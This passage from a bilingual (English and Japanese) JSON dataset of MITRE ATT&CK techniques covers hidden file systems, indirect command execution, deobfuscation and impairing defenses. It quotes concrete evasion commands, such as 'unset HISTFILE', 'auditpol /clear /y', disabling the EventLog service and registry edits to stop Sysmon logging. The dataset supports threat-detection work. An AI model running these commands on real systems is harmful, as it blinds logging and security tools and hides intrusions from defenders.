                        "description_jp": "攻撃者は、隠しファイルシステムを使用して、ユーザーやセキュリティツールから悪意のあるアクティビティを隠す可能性があります。ファイルシステムは、物理ストレージからデータを保存およびアクセスするための構造を提供します。通常、ユーザーは、ファイルやディレクトリへのアクセスを可能にするアプリケーションを介してファイルシステムと対話します。これらは、物理的な場所（ディスクセクターなど）からの抽象化です。標準的なファイルシステムには、FAT、NTFS、ext4、APFSなどがあります。ファイルシステムには、NTFSのボリュームブートレコード（VBR）やマスターファイルテーブル（MFT）など、他の構造も含まれる場合があります。(引用: MalwareTech VFS Nov 2014)\n\n攻撃者は、感染したシステムに存在する標準のファイルシステムとは別の、独自の抽象化されたファイルシステムを使用する可能性があります。そうすることで、攻撃者は悪意のあるコンポーネントやファイルの入出力をセキュリティツールから隠すことができます。隠しファイルシステム（仮想ファイルシステムと呼ばれることもあります）は、さまざまな方法で実装できます。1つの実装方法は、ディスク構造や標準のファイルシステムパーティションで使用されていない予約済みディスクスペースにファイルシステムを格納することです。(引用: MalwareTech VFS Nov 2014)(引用: FireEye Bootkits) 別の実装方法としては、攻撃者が独自のポータブルパーティションイメージをファイルとして標準のファイルシステムの上にドロップすることが考えられます。(引用: ESET ComRAT May 2020) 攻撃者はまた、既存のファイルシステム構造全体に非標準的な方法でファイルを断片化する可能性もあります。(引用: Kaspersky Equation QA)"
                    }
                ]
            },
            {
                "id": "T1202",
                "name_eng": "Indirect Command Execution",
                "name_jp": "間接コマンド実行",
                "description_eng": "Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (`pcalua.exe`), components of the Windows Subsystem for Linux (WSL), `Scriptrunner.exe`, as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts.(Citation: VectorSec ForFiles Aug 2017)(Citation: Evi1cg Forfiles Nov 2017)(Citation: Secure Team - Scriptrunner.exe)(Citation: SS64)(Citation: Bleeping Computer - Scriptrunner.exe) Adversaries may also abuse the `ssh.exe` binary to execute malicious commands via the `ProxyCommand` and `LocalCommand` options, which can be invoked via the `-o` flag or by modifying the SSH config file.(Citation: Threat Actor Targets the Manufacturing industry with Lumma Stealer and Amadey Bot)\n\nAdversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",
                "description_jp": "攻撃者は、コマンドラインインタプリタの使用を制限するセキュリティ制限をバイパスするために、コマンド実行を許可するユーティリティを悪用する可能性があります。さまざまなWindowsユーティリティを使用して、おそらく[cmd](https://attack.mitre.org/software/S0106)を呼び出すことなくコマンドを実行できます。例えば、[Forfiles](https://attack.mitre.org/software/S0193)、プログラム互換性アシスタント（`pcalua.exe`）、Windows Subsystem for Linux（WSL）のコンポーネント、`Scriptrunner.exe`、およびその他のユーティリティは、[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)、実行ウィンドウ、またはスクリプトを介してプログラムやコマンドの実行を呼び出す可能性があります。(引用: VectorSec ForFiles Aug 2017)(引用: Evi1cg Forfiles Nov 2017)(引用: Secure Team - Scriptrunner.exe)(引用: SS64)(引用: Bleeping Computer - Scriptrunner.exe) 攻撃者はまた、`ssh.exe`バイナリを悪用して、`-o`フラグを介して呼び出すか、SSH構成ファイルを変更することによって呼び出すことができる`ProxyCommand`および`LocalCommand`オプションを介して悪意のあるコマンドを実行する可能性があります。(引用: Threat Actor Targets the Manufacturing industry with Lumma Stealer and Amadey Bot)\n\n攻撃者は、これらの機能を[防御回避](https://attack.mitre.org/tactics/TA0005)のために悪用する可能性があり、具体的には、[cmd](https://attack.mitre.org/software/S0106)の使用や悪意のあるペイロードに一般的に関連付けられているファイル拡張子の使用を制限/防止する検出や緩和制御（グループポリシーなど）を破壊しながら任意の実行を実行するためです。",
                "subtechniques": []
            },
            {
                "id": "T1140",
                "name_eng": "Deobfuscate/Decode Files or Information",
                "name_jp": "ファイルまたは情報の難読化解除/デコード",
                "description_eng": "Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> or <code>type</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)(Citation: Sentinel One Tainted Love 2023)\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.(Citation: Volexity PowerDuke November 2016)",
                "description_jp": "攻撃者は、[難読化されたファイルまたは情報](https://attack.mitre.org/techniques/T1027)を使用して、侵入のアーティファクトを分析から隠す可能性があります。それらをどのように使用するかに応じて、その情報をデコードまたは難読化解除するための個別のメカニズムが必要になる場合があります。そのための方法には、マルウェアの組み込み機能や、システムに存在するユーティリティの使用が含まれます。\n\nそのような例の1つは、証明書ファイル内に隠されているリモートアクセスツールポータブル実行可能ファイルをデコードするために[certutil](https://attack.mitre.org/software/S0160)を使用することです。(引用: Malwarebytes Targeted Attack against Saudi Arabia) 別の例は、Windowsの<code>copy /b</code>または<code>type</code>コマンドを使用してバイナリフラグメントを悪意のあるペイロードに再構築することです。(引用: Carbon Black Obfuscation Sept 2016)(引用: Sentinel One Tainted Love 2023)\n\n場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)の一環として難読化解除または復号化のためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016)",
                "subtechniques": []
            },
            {
                "id": "T1562",
                "name_eng": "Impair Defenses",
                "name_jp": "防御の阻害",
                "description_eng": "Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)",
                "description_jp": "攻撃者は、防御メカニズムを妨害または無効にするために、被害者環境のコンポーネントを悪意を持って変更する可能性があります。これには、ファイアウォールやウイルス対策などの予防的防御を損なうだけでなく、防御側がアクティビティを監査し悪意のある行動を特定するために使用できる検出機能も含まれます。これはまた、ネイティブの防御と、ユーザーや管理者によってインストールされた補足機能の両方に及ぶ可能性があります。\n\n攻撃者はまた、ユーザーのログアウトをブロックしたり、システムのシャットダウンを妨げたり、更新プロセスを無効化または変更したりするなど、防御的な衛生状態に寄与する日常業務を損なう可能性があります。攻撃者はまた、イベント集約および分析メカニズムを標的にしたり、他のシステムコンポーネントを変更することによってこれらの手順を混乱させたりする可能性もあります。これらの制限により、悪意のある操作やインシデントの継続的な伝播がさらに可能になる可能性があります。(引用: Google Cloud Mandiant UNC3886 2024)(引用: Emotet shutdown)",
                "subtechniques": [
                    {
                        "id": "T1562.003",
                        "name_eng": "Impair Command History Logging",
                        "name_jp": "コマンド履歴ログの阻害",
                        "description_eng": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. The `HISTFILE` environment variable is also used in some ESXi systems.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                        "description_jp": "攻撃者は、侵害されたシステムで実行したコマンドを隠すために、コマンド履歴のログ記録を妨害する可能性があります。さまざまなコマンドインタプリタは、ユーザーが端末に入力したコマンドを追跡し、ユーザーが実行した内容を遡れるようにします。\n\nLinuxおよびmacOSでは、コマンド履歴は環境変数<code>HISTFILE</code>が指すファイルに記録されます。ユーザーがシステムからログオフすると、この情報はユーザーのホームディレクトリにある<code>~/.bash_history</code>というファイルに書き込まれます。<code>HISTCONTROL</code>環境変数は、<code>history</code>コマンドによって保存され、ユーザーがログオフしたときに最終的に<code>~/.bash_history</code>ファイルに書き込まれるべき内容を追跡します。<code>HISTCONTROL</code>はmacOSにはデフォルトでは存在しませんが、ユーザーが設定でき、尊重されます。<code>HISTFILE</code>環境変数は、一部のESXiシステムでも使用されます。(引用: Google Cloud Threat Intelligence ESXi VIBs 2022)\n\n攻撃者は、履歴環境変数をクリアしたり（<code>unset HISTFILE</code>）、コマンド履歴サイズをゼロに設定したり（<code>export HISTFILESIZE=0</code>）して、コマンドのログ記録を防ぐ可能性があります。さらに、<code>HISTCONTROL</code>は、単に「ignorespace」に設定することで、スペースで始まるコマンドを無視するように構成できます。<code>HISTCONTROL</code>はまた、「ignoredups」に設定することで重複するコマンドを無視するように設定することもできます。一部のLinuxシステムでは、これはデフォルトで「ignoreboth」に設定されており、これは前の両方の例をカバーしています。つまり、「 ls」は保存されませんが、「ls」は履歴によって保存されます。攻撃者はこれを悪用して、端末コマンドのすべてにスペースを先頭に追加するだけで痕跡を残さずに操作できます。\n\nWindowsシステムでは、<code>PSReadLine</code>モジュールがすべてのPowerShellセッションで使用されたコマンドを追跡し、ファイル（デフォルトでは<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code>）に書き込みます。攻撃者は、<code>Set-PSReadLineOption -HistorySavePath {ファイルパス}</code>を使用してこれらのログの保存場所を変更する可能性があります。これにより、<code>ConsoleHost_history.txt</code>はログの受信を停止します。さらに、PowerShellコマンド<code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>を使用してこのファイルへのログ記録をオフにすることも可能です。(引用: Microsoft PowerShell Command History)(引用: Sophos PowerShell command audit)(引用: Sophos PowerShell Command History Forensics)\n\n攻撃者はまた、ネットワークデバイス上の[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)を利用して、過去のコマンドログを無効にする可能性があります（例: <code>no logging</code>）。"
                    },
                    {
                        "id": "T1562.004",
                        "name_eng": "Disable or Modify System Firewall",
                        "name_jp": "システムファイアウォールの無効化または変更",
                        "description_eng": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.(Citation: Huntress BlackCat) Settings related to enabling abuse of various [Remote Services](https://attack.mitre.org/techniques/T1021) may also indirectly modify firewall rules.\n\nIn ESXi, firewall rules may be modified directly via the esxcli command line interface (e.g., via `esxcli network firewall set`) or via the vCenter user interface.(Citation: Trellix Rnasomhouse 2024)(Citation: Broadcom ESXi Firewall)",
                        "description_jp": "攻撃者は、ネットワーク使用を制限する制御をバイパスするために、システムファイアウォールを無効化または変更する可能性があります。変更には、メカニズム全体の無効化や、特定のルールの追加、削除、変更が含まれる場合があります。これはオペレーティングシステムによってさまざまな方法で行うことができ、コマンドライン、Windowsレジストリキーの編集、Windowsコントロールパネルなどがあります。\n\nシステムファイアウォールを変更または無効にすると、他の方法では許可されない攻撃者のC2通信、横方向の移動、および/またはデータ持ち出しが可能になる場合があります。例えば、攻撃者は、従来とは異なり、潜在的にセキュリティが低いポート（つまり[非標準ポート](https://attack.mitre.org/techniques/T1571)）を使用して、よく知られたプロトコル（RDPなど）の新しいファイアウォールルールを追加する可能性があります。(引用: change_rdp_port_conti)\n\n攻撃者はまた、インターフェース帯域幅やネットワーク接続要求のしきい値など、間接的にシステムファイアウォールを操作するホストネットワーク設定を変更する可能性があります。(引用: Huntress BlackCat) 様々な[リモートサービス](https://attack.mitre.org/techniques/T1021)の悪用を可能にする設定に関連する設定も、間接的にファイアウォールルールを変更する可能性があります。\n\nESXiでは、ファイアウォールルールはesxcliコマンドラインインターフェイス（例：<code>esxcli network firewall set</code>経由）またはvCenterユーザーインターフェイス経由で直接変更できます。(引用: Trellix Rnasomhouse 2024)(引用: Broadcom ESXi Firewall)"
                    },
                    {
                        "id": "T1562.002",
                        "name_eng": "Disable Windows Event Logging",
                        "name_jp": "Windowsイベントログの無効化",
                        "description_eng": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the “Start” value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                        "description_jp": "攻撃者は、検出や監査に利用できるデータを制限するために、Windowsイベントログを無効にする可能性があります。Windowsイベントログは、ログイン試行、プロセス作成など、ユーザーやシステムのさまざまなアクティビティを記録します。(引用: Windows Log Events) このデータは、セキュリティツールやアナリストが検出を生成するために使用されます。\n\nEventLogサービスは、さまざまなシステムコンポーネントやアプリケーションからのイベントログを管理します。(引用: EventLog_Core_Technologies) デフォルトでは、このサービスはシステムの起動時に自動的に開始されます。ローカルセキュリティポリシー（secpol.msc）によって管理される監査ポリシーは、EventLogサービスがログに記録するシステムイベントを定義します。セキュリティ監査ポリシー設定は、secpol.mscを実行し、基本的な監査ポリシー設定の場合は<code>セキュリティ設定\\ローカルポリシー\\監査ポリシー</code>に、高度な監査ポリシー設定の場合は<code>セキュリティ設定\\高度な監査ポリシー構成</code>に移動することで変更できます。(引用: Audit_Policy_Microsoft)(引用: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code>を使用して監査ポリシーを設定することもできます。(引用: auditpol)\n\n敵対者は、システム全体のログ記録、または特定のアプリケーションのログ記録のみを標的にする可能性があります。例えば、Windows EventLogサービスは、<code>Set-Service -Name EventLog -Status Stopped</code>コマンドまたは<code>sc config eventlog start=disabled</code>コマンドを使用して無効にすることができます（その後、<code>Stop-Service  -Name EventLog</code>を使用してサービスを手動で停止します）。(引用: Disable_Win_Event_Logging)(引用: disable_win_evt_logging) さらに、このサービスは、<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code>の「Start」値を変更し、変更を有効にするためにシステムを再起動することで無効にすることができます。(引用: disable_win_evt_logging)\n\nレジストリキーの変更によってEventLogサービスを無効にする方法はいくつかあります。まず、管理者権限なしで、敵対者はキー<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>の「Start」値を変更し、その後システムを再起動してセキュリティEventLogを無効にすることができます。(引用: winser19_file_overwrite_bug_twitter) 次に、管理者権限があれば、敵対者は<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code>と<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code>の同じ値を変更して、EventLog全体を無効にすることができます。(引用: disable_win_evt_logging)\n\nさらに、敵対者はコマンドプロンプトで<code>auditpol</code>とそのサブコマンドを使用して、監査を無効にしたり、監査ポリシーをクリアしたりする可能性があります。指定された設定または監査カテゴリを有効または無効にするために、敵対者は<code>/success</code>または<code>/failure</code>パラメータを使用する可能性があります。例えば、<code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code>はアカウントログオンカテゴリの監査をオフにします。(引用: auditpol.exe_STRONTIC)(引用: T1562.002_redcanaryco) 監査ポリシーをクリアするために、敵対者は次の行を実行する可能性があります：<code>auditpol /clear /y</code>または<code>auditpol /remove /allusers</code>。(引用: T1562.002_redcanaryco)\n\nWindowsイベントログを無効にすることで、攻撃者は侵害の証拠をあまり残さずに活動できます。"
                    },
                    {
                        "id": "T1562.001",
                        "name_eng": "Disable or Modify Tools",
                        "name_jp": "ツールの無効化または変更",
                        "description_eng": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)\n\nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                        "description_jp": "攻撃者は、マルウェア/ツールやアクティビティの検出を回避するために、セキュリティツールを変更および/または無効にする可能性があります。これには、セキュリティソフトウェアのプロセスやサービスを強制終了したり、ツールが正しく動作しないようにレジストリキーや構成ファイルを変更/削除したり、セキュリティツールのスキャンや情報報告を妨害する他の方法など、さまざまな形態があります。攻撃者はまた、最新のセキュリティパッチが被害者システムのツールに到達するのを防ぐために更新を無効にする可能性もあります。(引用: SCADAfence_ransomware)\n\n攻撃者はまた、セキュリティツールによって展開され利用されるアーティファクトを改ざんする可能性があります。セキュリティツールは、特定のイベントへの可視性を維持するために、システムコンポーネントに動的な変更を加えることがあります。例えば、セキュリティ製品は、データ収集を容易にするために独自のモジュールをロードしたり、プロセスによってロードされたモジュールを変更したりすることがあります。[インジケーターブロッキング](https://attack.mitre.org/techniques/T1562/006)と同様に、攻撃者は検出を回避するために、ツールによって追加されたこれらの機能（特にユーザーランドに存在する、または攻撃者がアクセスできる可能性のあるもの）をアンフックしたり、その他の方法で変更したりする可能性があります。(引用: OutFlank System Calls)(引用: MDSec System Calls) あるいは、エンドポイント検出応答（EDR）ツールの除外リストに新しいディレクトリを追加し、[ファイル/パスの除外](https://attack.mitre.org/techniques/T1564/012)を介して悪意のあるファイルを隠すことができるようにする可能性もあります。(引用: BlackBerry WhisperGate 2022)(引用: Google Cloud Threat Intelligence FIN13 2021)\n\n敵対者はまた、Sysmonのような特定のアプリケーションに焦点を当てるかもしれません。例えば、<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code>の「Start」と「Enable」の値は、Sysmonのロギングを改ざんし、潜在的に無効にするために変更されるかもしれません。(引用：disable_win_evt_logging）\n\nネットワークデバイスでは、攻撃者は起動設定ファイルを変更することでデジタル署名検証チェックをスキップし、通常起動時に行われるファームウェア検証を効果的に無効にしようとする可能性があります。(引用：Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(引用：Analysis of FG-IR-22-369)\n\nクラウド環境では、攻撃者によって無効にされたツールには、AWS CloudWatchやGoogle Cloud Monitorなどのサービスに報告するクラウド監視エージェントが含まれる場合があります。\n\nさらに、防御ツールには改ざん防止メカニズムがあるかもしれませんが、攻撃者は正当なルートキット駆除キットなどのツールを悪用して、これらのツールを無効化および/または無効にする可能性があります。(引用: chasing_avaddon_ransomware)(引用: dharma_ransomware)(引用: demystifying_ryuk)(引用: doppelpaymer_crowdstrike) 例えば、攻撃者はGMERなどのツールを使用して、感染したシステム上の隠されたプロセスやウイルス対策ソフトウェアを見つけてシャットダウンしています。(引用: demystifying_ryuk)\n\nさらに、攻撃者はウイルス対策ソフトウェアから正当なドライバを悪用してカーネル空間へのアクセスを取得する（つまり、[権限昇格のための悪用](https://attack.mitre.org/techniques/T1068)）可能性があり、これにより改ざん防止機能をバイパスする可能性があります。(引用: avoslocker_ransomware)"
                    },
                    {
                        "id": "T1562.006",
                        "name_eng": "Indicator Blocking",
                        "name_jp": "インジケーターブロッキング",
                        "description_eng": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nFor example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code> to hide their malicious actions in a new or different .evtx log file. This action does not require a system reboot and takes effect immediately.(Citation: disable_win_evt_logging) \n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet or by interfacing directly with the Registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.\n\nIn Linux environments, adversaries may disable or reconfigure log processing tools such as syslog or nxlog to inhibit detection and monitoring capabilities to facilitate follow on behaviors. (Citation: LemonDuck) ESXi also leverages syslog, which can be reconfigured via commands such as `esxcli system syslog config set` and `esxcli system syslog config reload`.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)(Citation: Broadcom Configuring syslog on ESXi)",
                        "description_jp": "攻撃者は、センサーによって通常キャプチャされるインジケーターやイベントが収集・分析されるのをブロックしようとする可能性があります。これには、イベントトレースfor Windows (ETW)のようなホストベースのセンサーを悪意を持ってリダイレクトしたり(引用: Microsoft Lamin Sept 2017)、あるいはイベントテレメトリの収集とフローを制御する設定を改ざんすることによって無効にしたりすることも含まれます(引用: Microsoft About Event Tracing 2018)(引用: Medium Event Tracing Tampering 2018)。これらの設定は、構成ファイルやレジストリにシステム上に保存されたり、[PowerShell](https://attack.mitre.org/techniques/T1059/001)や[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)などの管理ユーティリティを介してアクセス可能であったりします。\n\n例えば、攻撃者は<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security</code>の`File`値を変更して、悪意のあるアクションを新しいまたは別の.evtxログファイルに隠す可能性があります。このアクションはシステムの再起動を必要とせず、即座に有効になります。(引用: disable_win_evt_logging)\n\nETWの中断は複数の方法で達成できますが、最も直接的なのは[PowerShell](https://attack.mitre.org/techniques/T1059/001)の<code>Set-EtwTraceProvider</code>コマンドレットを使用して条件を定義するか、レジストリと直接やり取りして変更を加えることです。\n\nネットワークベースのインジケータ報告の場合、敵対者は報告に関連するトラフィックをブロックして中央分析を防ぐことができます。これは、テレメトリ転送を担当するローカルプロセスを停止したり、セキュリティ情報イベント管理（SIEM）製品など、イベント集約を担当する特定のホストへのトラフィックをブロックするホストベースのファイアウォールルールを作成したりするなど、多くの手段で実行できます。\n\nLinux環境では、攻撃者はsyslogやnxlogなどのログ処理ツールを無効化または再構成して、検出および監視機能を阻害し、その後の行動を容易にする可能性があります。(引用: LemonDuck) ESXiもsyslogを利用しており、これは`esxcli system syslog config set`や`esxcli system syslog config reload`などのコマンドで再構成できます。(引用: Google Cloud Threat Intelligence ESXi VIBs 2022)(引用: Broadcom Configuring syslog on ESXi)"
                    },
                    {
                        "id": "T1562.012",
                        "name_eng": "Disable or Modify Linux Audit System",
                        "name_jp": "Linux監査システムの無効化または変更",
